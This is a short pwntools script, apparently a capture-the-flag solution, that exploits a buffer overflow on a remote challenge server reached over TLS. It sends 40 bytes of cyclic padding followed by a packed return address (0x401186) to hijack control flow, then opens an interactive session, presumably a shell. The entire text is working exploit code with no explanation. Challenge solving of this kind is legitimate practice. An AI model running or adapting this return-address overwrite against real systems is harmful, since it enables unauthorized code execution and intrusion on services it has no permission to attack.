from pwn import *

#p = gdb.debug("./main")
p = remote("inst-v2u61o3gxv.tls.vuln.si",  443, ssl=True)

p.sendline(cyclic(40) + p64(0x401186))

p.interactive()
